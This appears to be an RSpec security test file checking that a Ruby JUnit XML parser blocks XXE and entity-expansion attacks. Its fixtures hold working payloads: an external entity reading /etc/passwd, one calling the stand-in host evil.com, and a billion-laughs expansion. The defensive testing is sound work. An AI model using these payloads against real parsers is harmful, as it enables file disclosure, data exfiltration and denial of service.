# frozen_string_literal: true

require "spec_helper"

RSpec.describe Bells::JunitParser, "security" do
  subject(:parser) { described_class.new }

  describe "XXE protection" do
    it "prevents external entity expansion" do
      xxe_xml = <<~XML
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
        <testsuite name="test">
          <testcase classname="Test" name="&xxe;" time="0.1"/>
        </testsuite>
      XML

      # Should parse without executing external entity
      results = parser.parse_string(xxe_xml)

      # The entity should not be expanded
      expect(results).to be_an(Array)
      # Entity reference should be ignored/empty, not expanded to file contents
      expect(results.first.test_name).not_to include("root:")
    end

    it "prevents network access via external entities" do
      network_xxe = <<~XML
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/steal">]>
        <testsuite>
          <testcase classname="Test" name="test_&xxe;" time="0.1"/>
        </testsuite>
      XML

      # Should not make network request
      expect(WebMock).not_to receive(:request)

      results = parser.parse_string(network_xxe)
      expect(results).to be_an(Array)
    end

    it "prevents entity expansion DoS (billion laughs)" do
      billion_laughs = <<~XML
        <?xml version="1.0"?>
        <!DOCTYPE lolz [
          <!ENTITY lol "lol">
          <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
          <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
        ]>
        <testsuite>
          <testcase classname="Test" name="&lol3;" time="0.1"/>
        </testsuite>
      XML

      # Should parse without expanding entities (would cause memory exhaustion)
      expect {
        parser.parse_string(billion_laughs)
      }.not_to raise_error
    end
  end
end
